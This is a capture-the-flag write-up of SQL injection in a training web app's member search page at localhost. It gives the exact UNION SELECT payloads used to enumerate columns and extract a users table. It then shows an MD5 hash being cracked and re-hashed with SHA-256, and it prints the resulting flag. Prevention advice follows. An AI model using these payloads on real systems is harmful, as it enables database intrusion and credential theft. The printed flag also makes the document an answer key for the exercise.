## Breach 08 – SQL Injection in Member Search with Hash Forgery

**Vulnerability:**  
The member search feature embeds user input directly into SQL queries without sanitization, allowing SQL injection and unauthorized data extraction.

**OWASP Top 10 Mapping:**  
**A03:2021 – Injection**  
Directly including untrusted user input in SQL statements enables full backend data compromise.

**Exploitation:**  
- Accessed the member search page:
  ```
  http://localhost:8000/?page=member&id=1
  ```
- Performed basic injection to list all records:
  ```
  id=1 OR 1=1
  ```
- Found a hint in member ID 5: “hack me”.

- Identified the correct number of columns via trial:
  ```
  1 UNION SELECT NULL, NULL; --
  ```

- Listed all column names (without filtering by table name, as `WHERE table_name='users'` failed):
  ```
  1 UNION SELECT column_name, NULL FROM information_schema.columns; --
  ```

- Compared discovered column names with known patterns, focusing on:
  - `Commentaire`
  - `countersign`

- Extracted hashes from the `users` table:
  ```
  1 UNION SELECT Commentaire, countersign FROM users; --
  ```

- Found:
  - **Commentaire:** `Decrypt this password -> then lower all the char. Sha256 on it and it's good!`
  - **countersign (MD5 hash):** `5ff9d0165b4f92b14994e5c685cdce28`

- Decrypted the MD5 hash using hashes.com:
  ```
  5ff9d0165b4f92b14994e5c685cdce28 → FortyTwo
  ```

- Transformed the plaintext to lowercase → `fortytwo`

- Re-hashed it using SHA-256:
  ```bash
  echo -n fortytwo | sha256sum
  ```
  Result:
  ```
  10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
  ```

- Submitted the SHA-256 hash and received the flag.

**Prevention:**  
- Use parameterized queries or prepared statements to safely handle user input.
- Avoid exposing database structure via verbose errors or introspection.
- Validate and sanitize all input on the server side.
- Apply least privilege to DB accounts and avoid using admin-level DB users in the application.

**Flag:**  
`10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
